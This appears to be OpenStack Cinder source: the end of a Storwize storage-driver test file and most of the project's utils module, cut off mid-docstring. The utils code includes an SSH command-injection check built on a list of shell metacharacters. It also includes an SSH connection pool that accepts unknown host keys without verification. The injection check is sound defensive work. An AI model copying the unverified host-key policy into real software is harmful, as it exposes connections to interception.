        # preferred node set if in simulation mode, otherwise, just
        # another initialize connection.
        if self.USESIM:
            self.sim.error_injection('lsvdisk', 'blank_pref_node')
        self.driver.initialize_connection(volume2, self._connector)

        # Try to remove connection from host that doesn't exist (should fail)
        conn_no_exist = self._connector.copy()
        conn_no_exist['initiator'] = 'i_dont_exist'
        conn_no_exist['wwpns'] = ['0000000000000000']
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.terminate_connection,
                          volume1,
                          conn_no_exist)

        # Try to remove connection from volume that isn't mapped (should print
        # message but NOT fail)
        vol_no_exist = {'name': 'i_dont_exist'}
        self.driver.terminate_connection(vol_no_exist, self._connector)

        # Remove the mapping from the 1st volume and delete it
        self.driver.terminate_connection(volume1, self._connector)
        self.driver.delete_volume(volume1)
        self._assert_vol_exists(volume1['name'], False)

        # Make sure our host still exists
        host_name = self.driver._get_host_from_connector(self._connector)
        self.assertNotEqual(host_name, None)

        # Remove the mapping from the 2nd volume and delete it. The host should
        # be automatically removed because there are no more mappings.
        self.driver.terminate_connection(volume2, self._connector)
        self.driver.delete_volume(volume2)
        self._assert_vol_exists(volume2['name'], False)

        # Delete volume types that we created
        for protocol in ['FC', 'iSCSI']:
            volume_types.destroy(ctxt, types[protocol]['id'])

        # Check if our host still exists (it should not)
        if self.USESIM:
            ret = self.driver._get_host_from_connector(self._connector)
            self.assertEqual(ret, None)

    def test_storwize_svc_multi_host_maps(self):
        # We can't test connecting to multiple hosts from a single host when
        # using real storage
        if not self.USESIM:
            return

        # Create a volume to be used in mappings
        ctxt = context.get_admin_context()
        volume = self._generate_vol_info(None, None)
        self.driver.create_volume(volume)

        # Create volume types for protocols
        types = {}
        for protocol in ['FC', 'iSCSI']:
            opts = {'storage_protocol': '<in> ' + protocol}
            types[protocol] = volume_types.create(ctxt, protocol, opts)

        # Create a connector for the second 'host'
        wwpns = [str(random.randint(0, 9999999999999999)).zfill(16),
                 str(random.randint(0, 9999999999999999)).zfill(16)]
        initiator = 'test.initiator.%s' % str(random.randint(10000, 99999))
        conn2 = {'ip': '1.234.56.79',
                 'host': 'storwize-svc-test2',
                 'wwpns': wwpns,
                 'initiator': initiator}

        for protocol in ['FC', 'iSCSI']:
            volume['volume_type_id'] = types[protocol]['id']

            # Make sure that the volume has been created
            self._assert_vol_exists(volume['name'], True)

            self.driver.initialize_connection(volume, self._connector)

            self._set_flag('storwize_svc_multihostmap_enabled', False)
            self.assertRaises(exception.CinderException,
                              self.driver.initialize_connection, volume, conn2)

            self._set_flag('storwize_svc_multihostmap_enabled', True)
            self.driver.initialize_connection(volume, conn2)

            self.driver.terminate_connection(volume, conn2)
            self.driver.terminate_connection(volume, self._connector)

    def test_storwize_svc_delete_volume_snapshots(self):
        # Create a volume with two snapshots
        master = self._generate_vol_info(None, None)
        self.driver.create_volume(master)
        self.driver.db.volume_set(master)

        # Fail creating a snapshot - will force delete the snapshot
        if self.USESIM and False:
            snap = self._generate_vol_info(master['name'], master['id'])
            self.sim.error_injection('startfcmap', 'bad_id')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_snapshot, snap)
            self._assert_vol_exists(snap['name'], False)

        # Delete a snapshot
        snap = self._generate_vol_info(master['name'], master['id'])
        self.driver.create_snapshot(snap)
        self._assert_vol_exists(snap['name'], True)
        self.driver.delete_snapshot(snap)
        self._assert_vol_exists(snap['name'], False)

        # Delete a volume with snapshots (regular)
        snap = self._generate_vol_info(master['name'], master['id'])
        self.driver.create_snapshot(snap)
        self._assert_vol_exists(snap['name'], True)
        self.driver.delete_volume(master)
        self._assert_vol_exists(master['name'], False)

        # Fail create volume from snapshot - will force delete the volume
        if self.USESIM:
            volfs = self._generate_vol_info(None, None)
            self.sim.error_injection('startfcmap', 'bad_id')
            self.sim.error_injection('lsfcmap', 'speed_up')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_volume_from_snapshot,
                              volfs, snap)
            self._assert_vol_exists(volfs['name'], False)

        # Create volume from snapshot and delete it
        volfs = self._generate_vol_info(None, None)
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_volume_from_snapshot(volfs, snap)
        self._assert_vol_exists(volfs['name'], True)
        self.driver.delete_volume(volfs)
        self._assert_vol_exists(volfs['name'], False)

        # Create volume from snapshot and delete the snapshot
        volfs = self._generate_vol_info(None, None)
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_volume_from_snapshot(volfs, snap)
        self.driver.delete_snapshot(snap)
        self._assert_vol_exists(snap['name'], False)

        # Fail create clone - will force delete the target volume
        if self.USESIM:
            clone = self._generate_vol_info(None, None)
            self.sim.error_injection('startfcmap', 'bad_id')
            self.sim.error_injection('lsfcmap', 'speed_up')
            self.assertRaises(exception.ProcessExecutionError,
                              self.driver.create_cloned_volume,
                              clone, volfs)
            self._assert_vol_exists(clone['name'], False)

        # Create the clone, delete the source and target
        clone = self._generate_vol_info(None, None)
        if self.USESIM:
            self.sim.error_injection('lsfcmap', 'speed_up')
        self.driver.create_cloned_volume(clone, volfs)
        self._assert_vol_exists(clone['name'], True)
        self.driver.delete_volume(volfs)
        self._assert_vol_exists(volfs['name'], False)
        self.driver.delete_volume(clone)
        self._assert_vol_exists(clone['name'], False)

    # Note defined in python 2.6, so define here...
    def assertLessEqual(self, a, b, msg=None):
        if not a <= b:
            self.fail('%s not less than or equal to %s' % (repr(a), repr(b)))

    def test_storwize_svc_get_volume_stats(self):
        stats = self.driver.get_volume_stats()
        self.assertLessEqual(stats['free_capacity_gb'],
                             stats['total_capacity_gb'])
        if self.USESIM:
            self.assertEqual(stats['volume_backend_name'],
                             'storwize-svc-sim_volpool')
            self.assertAlmostEqual(stats['total_capacity_gb'], 3328.0)
            self.assertAlmostEqual(stats['free_capacity_gb'], 3287.5)

    def test_storwize_svc_extend_volume(self):
        volume = self._generate_vol_info(None, None)
        self.driver.db.volume_set(volume)
        self.driver.create_volume(volume)
        stats = self.driver.extend_volume(volume, '13')
        attrs = self.driver._get_vdisk_attributes(volume['name'])
        vol_size = int(attrs['capacity']) / units.GiB
        self.assertAlmostEqual(vol_size, 13)

        snap = self._generate_vol_info(volume['name'], volume['id'])
        self.driver.create_snapshot(snap)
        self._assert_vol_exists(snap['name'], True)
        self.assertRaises(exception.VolumeBackendAPIException,
                          self.driver.extend_volume, volume, '16')

        self.driver.delete_snapshot(snap)
        self.driver.delete_volume(volume)


class CLIResponseTestCase(test.TestCase):
    def test_empty(self):
        self.assertEqual(0, len(storwize_svc.CLIResponse('')))
        self.assertEqual(0, len(storwize_svc.CLIResponse(('', 'stderr'))))

    def test_header(self):
        raw = r'''id!name
1!node1
2!node2
'''
        resp = storwize_svc.CLIResponse(raw, with_header=True)
        self.assertEqual(2, len(resp))
        self.assertEqual('1', resp[0]['id'])
        self.assertEqual('2', resp[1]['id'])

    def test_select(self):
        raw = r'''id!123
name!Bill
name!Bill2
age!30
home address!s1
home address!s2

id! 7
name!John
name!John2
age!40
home address!s3
home address!s4
'''
        resp = storwize_svc.CLIResponse(raw, with_header=False)
        self.assertEqual(list(resp.select('home address', 'name',
                                          'home address')),
                         [('s1', 'Bill', 's1'), ('s2', 'Bill2', 's2'),
                          ('s3', 'John', 's3'), ('s4', 'John2', 's4')])

    def test_lsnode_all(self):
        raw = r'''id!name!UPS_serial_number!WWNN!status
1!node1!!500507680200C744!online
2!node2!!500507680200C745!online
'''
        resp = storwize_svc.CLIResponse(raw)
        self.assertEqual(2, len(resp))
        self.assertEqual('1', resp[0]['id'])
        self.assertEqual('500507680200C744', resp[0]['WWNN'])
        self.assertEqual('2', resp[1]['id'])
        self.assertEqual('500507680200C745', resp[1]['WWNN'])

    def test_lsnode_single(self):
        raw = r'''id!1
port_id!500507680210C744
port_status!active
port_speed!8Gb
port_id!500507680240C744
port_status!inactive
port_speed!8Gb
'''
        resp = storwize_svc.CLIResponse(raw, with_header=False)
        self.assertEqual(1, len(resp))
        self.assertEqual('1', resp[0]['id'])
        self.assertEqual(list(resp.select('port_id', 'port_status')),
                         [('500507680210C744', 'active'),
                          ('500507680240C744', 'inactive')])
/n/n/ncinder/utils.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4

# Copyright 2010 United States Government as represented by the
# Administrator of the National Aeronautics and Space Administration.
# Copyright 2011 Justin Santa Barbara
# All Rights Reserved.
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.

""""""Utilities and helper functions.""""""


import contextlib
import datetime
import functools
import hashlib
import inspect
import os
import paramiko
import pyclbr
import random
import re
import shutil
import sys
import tempfile
import time
from xml.dom import minidom
from xml.parsers import expat
from xml import sax
from xml.sax import expatreader
from xml.sax import saxutils

from eventlet import event
from eventlet import greenthread
from eventlet import pools

from oslo.config import cfg

from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import importutils
from cinder.openstack.common import lockutils
from cinder.openstack.common import log as logging
from cinder.openstack.common import processutils
from cinder.openstack.common import timeutils


CONF = cfg.CONF
LOG = logging.getLogger(__name__)
ISO_TIME_FORMAT = ""%Y-%m-%dT%H:%M:%S""
PERFECT_TIME_FORMAT = ""%Y-%m-%dT%H:%M:%S.%f""

synchronized = lockutils.synchronized_with_prefix('cinder-')


def find_config(config_path):
    """"""Find a configuration file using the given hint.

    :param config_path: Full or relative path to the config.
    :returns: Full path of the config, if it exists.
    :raises: `cinder.exception.ConfigNotFound`

    """"""
    possible_locations = [
        config_path,
        os.path.join(CONF.state_path, ""etc"", ""cinder"", config_path),
        os.path.join(CONF.state_path, ""etc"", config_path),
        os.path.join(CONF.state_path, config_path),
        ""/etc/cinder/%s"" % config_path,
    ]

    for path in possible_locations:
        if os.path.exists(path):
            return os.path.abspath(path)

    raise exception.ConfigNotFound(path=os.path.abspath(config_path))


def fetchfile(url, target):
    LOG.debug(_('Fetching %s') % url)
    execute('curl', '--fail', url, '-o', target)


def execute(*cmd, **kwargs):
    """"""Convenience wrapper around oslo's execute() method.""""""
    if 'run_as_root' in kwargs and not 'root_helper' in kwargs:
        kwargs['root_helper'] =\
            'sudo cinder-rootwrap %s' % CONF.rootwrap_config
    try:
        (stdout, stderr) = processutils.execute(*cmd, **kwargs)
    except processutils.ProcessExecutionError as ex:
        raise exception.ProcessExecutionError(
            exit_code=ex.exit_code,
            stderr=ex.stderr,
            stdout=ex.stdout,
            cmd=ex.cmd,
            description=ex.description)
    except processutils.UnknownArgumentError as ex:
        raise exception.Error(ex.message)
    return (stdout, stderr)


def trycmd(*args, **kwargs):
    """"""Convenience wrapper around oslo's trycmd() method.""""""
    if 'run_as_root' in kwargs and not 'root_helper' in kwargs:
        kwargs['root_helper'] =\
            'sudo cinder-rootwrap %s' % CONF.rootwrap_config
    try:
        (stdout, stderr) = processutils.trycmd(*args, **kwargs)
    except processutils.ProcessExecutionError as ex:
        raise exception.ProcessExecutionError(
            exit_code=ex.exit_code,
            stderr=ex.stderr,
            stdout=ex.stdout,
            cmd=ex.cmd,
            description=ex.description)
    except processutils.UnknownArgumentError as ex:
        raise exception.Error(ex.message)
    return (stdout, stderr)


def check_ssh_injection(cmd_list):
    ssh_injection_pattern = ['`', '$', '|', '||', ';', '&', '&&', '>', '>>',
                             '<']

    # Check whether injection attacks exist
    for arg in cmd_list:
        arg = arg.strip()
        # First, check no space in the middle of arg
        arg_len = len(arg.split())
        if arg_len > 1:
            raise exception.SSHInjectionThreat(command=str(cmd_list))

        # Second, check whether danger character in command. So the shell
        # special operator must be a single argument.
        for c in ssh_injection_pattern:
            if arg == c:
                continue

            result = arg.find(c)
            if not result == -1:
                if result == 0 or not arg[result - 1] == '\\':
                    raise exception.SSHInjectionThreat(command=cmd_list)


def ssh_execute(ssh, cmd, process_input=None,
                addl_env=None, check_exit_code=True):
    LOG.debug(_('Running cmd (SSH): %s'), cmd)
    if addl_env:
        raise exception.Error(_('Environment not supported over SSH'))

    if process_input:
        # This is (probably) fixable if we need it...
        raise exception.Error(_('process_input not supported over SSH'))

    stdin_stream, stdout_stream, stderr_stream = ssh.exec_command(cmd)
    channel = stdout_stream.channel

    #stdin.write('process_input would go here')
    #stdin.flush()

    # NOTE(justinsb): This seems suspicious...
    # ...other SSH clients have buffering issues with this approach
    stdout = stdout_stream.read()
    stderr = stderr_stream.read()
    stdin_stream.close()
    stdout_stream.close()
    stderr_stream.close()

    exit_status = channel.recv_exit_status()

    # exit_status == -1 if no exit code was returned
    if exit_status != -1:
        LOG.debug(_('Result was %s') % exit_status)
        if check_exit_code and exit_status != 0:
            raise exception.ProcessExecutionError(exit_code=exit_status,
                                                  stdout=stdout,
                                                  stderr=stderr,
                                                  cmd=cmd)
    channel.close()
    return (stdout, stderr)


def create_channel(client, width, height):
    """"""Invoke an interactive shell session on server.""""""
    channel = client.invoke_shell()
    channel.resize_pty(width, height)
    return channel


class SSHPool(pools.Pool):
    """"""A simple eventlet pool to hold ssh connections.""""""

    def __init__(self, ip, port, conn_timeout, login, password=None,
                 privatekey=None, *args, **kwargs):
        self.ip = ip
        self.port = port
        self.login = login
        self.password = password
        self.conn_timeout = conn_timeout if conn_timeout else None
        self.privatekey = privatekey
        super(SSHPool, self).__init__(*args, **kwargs)

    def create(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if self.password:
                ssh.connect(self.ip,
                            port=self.port,
                            username=self.login,
                            password=self.password,
                            timeout=self.conn_timeout)
            elif self.privatekey:
                pkfile = os.path.expanduser(self.privatekey)
                privatekey = paramiko.RSAKey.from_private_key_file(pkfile)
                ssh.connect(self.ip,
                            port=self.port,
                            username=self.login,
                            pkey=privatekey,
                            timeout=self.conn_timeout)
            else:
                msg = _(""Specify a password or private_key"")
                raise exception.CinderException(msg)

            # Paramiko by default sets the socket timeout to 0.1 seconds,
            # ignoring what we set thru the sshclient. This doesn't help for
            # keeping long lived connections. Hence we have to bypass it, by
            # overriding it after the transport is initialized. We are setting
            # the sockettimeout to None and setting a keepalive packet so that,
            # the server will keep the connection open. All that does is send
            # a keepalive packet every ssh_conn_timeout seconds.
            if self.conn_timeout:
                transport = ssh.get_transport()
                transport.sock.settimeout(None)
                transport.set_keepalive(self.conn_timeout)
            return ssh
        except Exception as e:
            msg = _(""Error connecting via ssh: %s"") % e
            LOG.error(msg)
            raise paramiko.SSHException(msg)

    def get(self):
        """"""
        Return an item from the pool, when one is available.  This may
        cause the calling greenthread to block. Check if a connection is active
        before returning it. For dead connections create and return a new
        connection.
        """"""
        conn = super(SSHPool, self).get()
        if conn:
            if conn.get_transport().is_active():
                return conn
            else:
                conn.close()
        return self.create()

    def remove(self, ssh):
        """"""Close an ssh client and remove it from free_items.""""""
        ssh.close()
        ssh = None
        if ssh in self.free_items:
            self.free_items.pop(ssh)
        if self.current_size > 0:
            self.current_size -= 1


def cinderdir():
    import cinder
    return os.path.abspath(cinder.__file__).split('cinder/__init__.py')[0]


def debug(arg):
    LOG.debug(_('debug in callback: %s'), arg)
    return arg


def generate_uid(topic, size=8):
    characters = '01234567890abcdefghijklmnopqrstuvwxyz'
    choices = [random.choice(characters) for x in xrange(size)]
    return '%s-%s' % (topic, ''.join(choices))


# Default symbols to use for passwords. Avoids visually confusing characters.
# ~6 bits per symbol
DEFAULT_PASSWORD_SYMBOLS = ('23456789',  # Removed: 0,1
                            'ABCDEFGHJKLMNPQRSTUVWXYZ',   # Removed: I, O
                            'abcdefghijkmnopqrstuvwxyz')  # Removed: l


# ~5 bits per symbol
EASIER_PASSWORD_SYMBOLS = ('23456789',  # Removed: 0, 1
                           'ABCDEFGHJKLMNPQRSTUVWXYZ')  # Removed: I, O


def last_completed_audit_period(unit=None):
    """"""This method gives you the most recently *completed* audit period.

    arguments:
            units: string, one of 'hour', 'day', 'month', 'year'
                    Periods normally begin at the beginning (UTC) of the
                    period unit (So a 'day' period begins at midnight UTC,
                    a 'month' unit on the 1st, a 'year' on Jan, 1)
                    unit string may be appended with an optional offset
                    like so:  'day@18'  This will begin the period at 18:00
                    UTC.  'month@15' starts a monthly period on the 15th,
                    and year@3 begins a yearly one on March 1st.


    returns:  2 tuple of datetimes (begin, end)
              The begin timestamp of this audit period is the same as the
              end of the previous.
    """"""
    if not unit:
        unit = CONF.volume_usage_audit_period

    offset = 0
    if '@' in unit:
        unit, offset = unit.split(""@"", 1)
        offset = int(offset)

    rightnow = timeutils.utcnow()
    if unit not in ('month', 'day', 'year', 'hour'):
        raise ValueError('Time period must be hour, day, month or year')
    if unit == 'month':
        if offset == 0:
            offset = 1
        end = datetime.datetime(day=offset,
                                month=rightnow.month,
                                year=rightnow.year)
        if end >= rightnow:
            year = rightnow.year
            if 1 >= rightnow.month:
                year -= 1
                month = 12 + (rightnow.month - 1)
            else:
                month = rightnow.month - 1
            end = datetime.datetime(day=offset,
                                    month=month,
                                    year=year)
        year = end.year
        if 1 >= end.month:
            year -= 1
            month = 12 + (end.month - 1)
        else:
            month = end.month - 1
        begin = datetime.datetime(day=offset, month=month, year=year)

    elif unit == 'year':
        if offset == 0:
            offset = 1
        end = datetime.datetime(day=1, month=offset, year=rightnow.year)
        if end >= rightnow:
            end = datetime.datetime(day=1,
                                    month=offset,
                                    year=rightnow.year - 1)
            begin = datetime.datetime(day=1,
                                      month=offset,
                                      year=rightnow.year - 2)
        else:
            begin = datetime.datetime(day=1,
                                      month=offset,
                                      year=rightnow.year - 1)

    elif unit == 'day':
        end = datetime.datetime(hour=offset,
                                day=rightnow.day,
                                month=rightnow.month,
                                year=rightnow.year)
        if end >= rightnow:
            end = end - datetime.timedelta(days=1)
        begin = end - datetime.timedelta(days=1)

    elif unit == 'hour':
        end = rightnow.replace(minute=offset, second=0, microsecond=0)
        if end >= rightnow:
            end = end - datetime.timedelta(hours=1)
        begin = end - datetime.timedelta(hours=1)

    return (begin, end)


def generate_password(length=20, symbolgroups=DEFAULT_PASSWORD_SYMBOLS):
    """"""Generate a random password from the supplied symbol groups.

    At least one symbol from each group will be included. Unpredictable
    results if length is less than the number of symbol groups.

    Believed to be reasonably secure (with a reasonable password length!)

    """"""
    r = random.SystemRandom()

    # NOTE(jerdfelt): Some password policies require at least one character
    # from each group of symbols, so start off with one random character
    # from each symbol group
    password = [r.choice(s) for s in symbolgroups]
    # If length < len(symbolgroups), the leading characters will only
    # be from the first length groups. Try our best to not be predictable
    # by shuffling and then truncating.
    r.shuffle(password)
    password = password[:length]
    length -= len(password)

    # then fill with random characters from all symbol groups
    symbols = ''.join(symbolgroups)
    password.extend([r.choice(symbols) for _i in xrange(length)])

    # finally shuffle to ensure first x characters aren't from a
    # predictable group
    r.shuffle(password)

    return ''.join(password)


def generate_username(length=20, symbolgroups=DEFAULT_PASSWORD_SYMBOLS):
    # Use the same implementation as the password generation.
    return generate_password(length, symbolgroups)


def last_octet(address):
    return int(address.split('.')[-1])


def get_my_linklocal(interface):
    try:
        if_str = execute('ip', '-f', 'inet6', '-o', 'addr', 'show', interface)
        condition = '\s+inet6\s+([0-9a-f:]+)/\d+\s+scope\s+link'
        links = [re.search(condition, x) for x in if_str[0].split('\n')]
        address = [w.group(1) for w in links if w is not None]
        if address[0] is not None:
            return address[0]
        else:
            raise exception.Error(_('Link Local address is not found.:%s')
                                  % if_str)
    except Exception as ex:
        raise exception.Error(_(""Couldn't get Link Local IP of %(interface)s""
                                "" :%(ex)s"") %
                              {'interface': interface, 'ex': ex, })


def parse_mailmap(mailmap='.mailmap'):
    mapping = {}
    if os.path.exists(mailmap):
        fp = open(mailmap, 'r')
        for l in fp:
            l = l.strip()
            if not l.startswith('#') and ' ' in l:
                canonical_email, alias = l.split(' ')
                mapping[alias.lower()] = canonical_email.lower()
    return mapping


def str_dict_replace(s, mapping):
    for s1, s2 in mapping.iteritems():
        s = s.replace(s1, s2)
    return s


class LazyPluggable(object):
    """"""A pluggable backend loaded lazily based on some value.""""""

    def __init__(self, pivot, **backends):
        self.__backends = backends
        self.__pivot = pivot
        self.__backend = None

    def __get_backend(self):
        if not self.__backend:
            backend_name = CONF[self.__pivot]
            if backend_name not in self.__backends:
                raise exception.Error(_('Invalid backend: %s') % backend_name)

            backend = self.__backends[backend_name]
            if isinstance(backend, tuple):
                name = backend[0]
                fromlist = backend[1]
            else:
                name = backend
                fromlist = backend

            self.__backend = __import__(name, None, None, fromlist)
            LOG.debug(_('backend %s'), self.__backend)
        return self.__backend

    def __getattr__(self, key):
        backend = self.__get_backend()
        return getattr(backend, key)


class LoopingCallDone(Exception):
    """"""Exception to break out and stop a LoopingCall.

    The poll-function passed to LoopingCall can raise this exception to
    break out of the loop normally. This is somewhat analogous to
    StopIteration.

    An optional return-value can be included as the argument to the exception;
    this return-value will be returned by LoopingCall.wait()

    """"""

    def __init__(self, retvalue=True):
        """""":param retvalue: Value that LoopingCall.wait() should return.""""""
        self.retvalue = retvalue


class LoopingCall(object):
    def __init__(self, f=None, *args, **kw):
        self.args = args
        self.kw = kw
        self.f = f
        self._running = False

    def start(self, interval, initial_delay=None):
        self._running = True
        done = event.Event()

        def _inner():
            if initial_delay:
                greenthread.sleep(initial_delay)

            try:
                while self._running:
                    self.f(*self.args, **self.kw)
                    if not self._running:
                        break
                    greenthread.sleep(interval)
            except LoopingCallDone as e:
                self.stop()
                done.send(e.retvalue)
            except Exception:
                LOG.exception(_('in looping call'))
                done.send_exception(*sys.exc_info())
                return
            else:
                done.send(True)

        self.done = done

        greenthread.spawn(_inner)
        return self.done

    def stop(self):
        self._running = False

    def wait(self):
        return self.done.wait()


class ProtectedExpatParser(expatreader.ExpatParser):
    """"""An expat parser which disables DTD's and entities by default.""""""

    def __init__(self, forbid_dtd=True, forbid_entities=True,
                 *args, **kwargs):
        # Python 2.x old style class
        expatreader.ExpatParser.__init__(self, *args, **kwargs)
        self.forbid_dtd = forbid_dtd
        self.forbid_entities = forbid_entities

    def start_doctype_decl(self, name, sysid, pubid, has_internal_subset):
        raise ValueError(""Inline DTD forbidden"")

    def entity_decl(self, entityName, is_parameter_entity, value, base,
                    systemId, publicId, notationName):
        raise ValueError(""<!ENTITY> forbidden"")

    def unparsed_entity_decl(self, name, base, sysid, pubid, notation_name):
        # expat 1.2
        raise ValueError(""<!ENTITY> forbidden"")

    def reset(self):
        expatreader.ExpatParser.reset(self)
        if self.forbid_dtd:
            self._parser.StartDoctypeDeclHandler = self.start_doctype_decl
        if self.forbid_entities:
            self._parser.EntityDeclHandler = self.entity_decl
            self._parser.UnparsedEntityDeclHandler = self.unparsed_entity_decl


def safe_minidom_parse_string(xml_string):
    """"""Parse an XML string using minidom safely.

    """"""
    try:
        return minidom.parseString(xml_string, parser=ProtectedExpatParser())
    except sax.SAXParseException as se:
        raise expat.ExpatError()


def xhtml_escape(value):
    """"""Escapes a string so it is valid within XML or XHTML.

    """"""
    return saxutils.escape(value, {'""': '&quot;', ""'"": '&apos;'})


def utf8(value):
    """"""Try to turn a string into utf-8 if possible.

    """"""
    if isinstance(value, unicode):
        return value.encode('utf-8')
    elif isinstance(value, str):
        return value
    else:
        raise ValueError(""%s is not a string"" % value)


def get_from_path(items, path):
    """"""Returns a list of items matching the specified path.

    Takes an XPath-like expression e.g. prop1/prop2/prop3, and for each item
    in items, looks up items[prop1][prop2][prop3]. Like XPath, if any of the
    intermediate results are lists it will treat each list item individually.
    A 'None' in items or any child expressions will be ignored, this function
    will not throw because of None (anywhere) in items.  The returned list
    will contain no None values.

    """"""
    if path is None:
        raise exception.Error('Invalid mini_xpath')

    (first_token, sep, remainder) = path.partition('/')

    if first_token == '':
        raise exception.Error('Invalid mini_xpath')

    results = []

    if items is None:
        return results

    if not isinstance(items, list):
        # Wrap single objects in a list
        items = [items]

    for item in items:
        if item is None:
            continue
        get_method = getattr(item, 'get', None)
        if get_method is None:
            continue
        child = get_method(first_token)
        if child is None:
            continue
        if isinstance(child, list):
            # Flatten intermediate lists
            for x in child:
                results.append(x)
        else:
            results.append(child)

    if not sep:
        # No more tokens
        return results
    else:
        return get_from_path(results, remainder)


def flatten_dict(dict_, flattened=None):
    """"""Recursively flatten a nested dictionary.""""""
    flattened = flattened or {}
    for key, value in dict_.iteritems():
        if hasattr(value, 'iteritems'):
            flatten_dict(value, flattened)
        else:
            flattened[key] = value
    return flattened


def partition_dict(dict_, keys):
    """"""Return two dicts, one with `keys` the other with everything else.""""""
    intersection = {}
    difference = {}
    for key, value in dict_.iteritems():
        if key in keys:
            intersection[key] = value
        else:
            difference[key] = value
    return intersection, difference


def map_dict_keys(dict_, key_map):
    """"""Return a dict in which the dictionaries keys are mapped to new keys.""""""
    mapped = {}
    for key, value in dict_.iteritems():
        mapped_key = key_map[key] if key in key_map else key
        mapped[mapped_key] = value
    return mapped


def subset_dict(dict_, keys):
    """"""Return a dict that only contains a subset of keys.""""""
    subset = partition_dict(dict_, keys)[0]
    return subset


def check_isinstance(obj, cls):
    """"""Checks that obj is of type cls, and lets PyLint infer types.""""""
    if isinstance(obj, cls):
        return obj
    raise Exception(_('Expected object of type: %s') % (str(cls)))
    # TODO(justinsb): Can we make this better??
    return cls()  # Ugly PyLint hack


def is_valid_boolstr(val):
    """"""Check if the provided string is a valid bool string or not.""""""
    val = str(val).lower()
    return (val == 'true' or val == 'false' or
            val == 'yes' or val == 'no' or
            val == 'y' or val == 'n' or
            val == '1' or val == '0')


def is_valid_ipv4(address):
    """"""valid the address strictly as per format xxx.xxx.xxx.xxx.
    where xxx is a value between 0 and 255.
    """"""
    parts = address.split(""."")
    if len(parts) != 4:
        return False
    for item in parts:
        try:
            if not 0 <= int(item) <= 255:
                return False
        except ValueError:
            return False
    return True


def monkey_patch():
    """"""If the CONF.monkey_patch set as True,
    this function patches a decorator
    for all functions in specified modules.

    You can set decorators for each modules
    using CONF.monkey_patch_modules.
    The format is ""Module path:Decorator function"".
    Example: 'cinder.api.ec2.cloud:' \
     cinder.openstack.common.notifier.api.notify_decorator'

    Parameters of the decorator is as follows.
    (See cinder.openstack.common.notifier.api.notify_decorator)

    name - name of the function
    function - object of the function
    """"""
    # If CONF.monkey_patch is not True, this function do nothing.
    if not CONF.monkey_patch:
        return
    # Get list of modules and decorators
    for module_and_decorator in CONF.monkey_patch_modules:
        module, decorator_name = module_and_decorator.split(':')
        # import decorator function
        decorator = importutils.import_class(decorator_name)
        __import__(module)
        # Retrieve module information using pyclbr
        module_data = pyclbr.readmodule_ex(module)
        for key in module_data.keys():
            # set the decorator for the class methods
            if isinstance(module_data[key], pyclbr.Class):
                clz = importutils.import_class(""%s.%s"" % (module, key))
                for method, func in inspect.getmembers(clz, inspect.ismethod):
                    setattr(
                        clz, method,
                        decorator(""%s.%s.%s"" % (module, key, method), func))
            # set the decorator for the function
            if isinstance(module_data[key], pyclbr.Function):
                func = importutils.import_class(""%s.%s"" % (module, key))
                setattr(sys.modules[module], key,
                        decorator(""%s.%s"" % (module, key), func))


def convert_to_list_dict(lst, label):
    """"""Convert a value or list into a list of dicts""""""
    if not lst:
        return None
    if not isinstance(lst, list):
        lst = [lst]
    return [{label: x} for x in lst]


def timefunc(func):
    """"""Decorator that logs how long a particular function took to execute""""""
    @functools.wraps(func)
    def inner(*args, **kwargs):
        start_time = time.time()
        try:
            return func(*args, **kwargs)
        finally:
            total_time = time.time() - start_time
            LOG.debug(_(""timefunc: '%(name)s' took %(total_time).2f secs"") %
                      dict(name=func.__name__, total_time=total_time))
    return inner


def generate_glance_url():
    """"""Generate the URL to glance.""""""
    # TODO(jk0): This will eventually need to take SSL into consideration
    # when supported in glance.
    return ""http://%s:%d"" % (CONF.glance_host, CONF.glance_port)


@contextlib.contextmanager
def logging_error(message):
    """"""Catches exception, write message to the log, re-raise.
    This is a common refinement of save_and_reraise that writes a specific
    message to the log.
    """"""
    try:
        yield
    except Exception as error:
        with excutils.save_and_reraise_exception():
            LOG.exception(message)


def make_dev_path(dev, partition=None, base='/dev'):
    """"""Return a path to a particular device.

    >>> make_dev_path('xvdc')
    /dev/xvdc

    >>> make_dev_path('xvdc', 1)
    /dev/xvdc1
    """"""
    path = os.path.join(base, dev)
    if partition:
        path += str(partition)
    return path


def total_seconds(td):
    """"""Local total_seconds implementation for compatibility with python 2.6""""""
    if hasattr(td, 'total_seconds'):
        return td.total_seconds()
    else:
        return ((td.days * 86400 + td.seconds) * 10 ** 6 +
                td.microseconds) / 10.0 ** 6


def sanitize_hostname(hostname):
    """"""Return a hostname which conforms to RFC-952 and RFC-1123 specs.""""""
    if isinstance(hostname, unicode):
        hostname = hostname.encode('latin-1', 'ignore')

    hostname = re.sub('[ _]', '-', hostname)
    hostname = re.sub('[^\w.-]+', '', hostname)
    hostname = hostname.lower()
    hostname = hostname.strip('.-')

    return hostname


def read_cached_file(filename, cache_info, reload_func=None):
    """"""Read from a file if it has been modified.

    :param cache_info: dictionary to hold opaque cache.
    :param reload_func: optional function to be called with data when
                        file is reloaded due to a modification.

    :returns: data from file

    """"""
    mtime = os.path.getmtime(filename)
    if not cache_info or mtime != cache_info.get('mtime'):
        with open(filename) as fap:
            cache_info['data'] = fap.read()
        cache_info['mtime'] = mtime
        if reload_func:
            reload_func(cache_info['data'])
    return cache_info['data']


def hash_file(file_like_object):
    """"""Generate a hash for the contents of a file.""""""
    checksum = hashlib.sha1()
    any(map(checksum.update, iter(lambda: file_like_object.read(32768), '')))
    return checksum.hexdigest()


@contextlib.contextmanager
def temporary_mutation(obj, **kwargs):
    """"""Temporarily set the attr on a particular object to a given value then
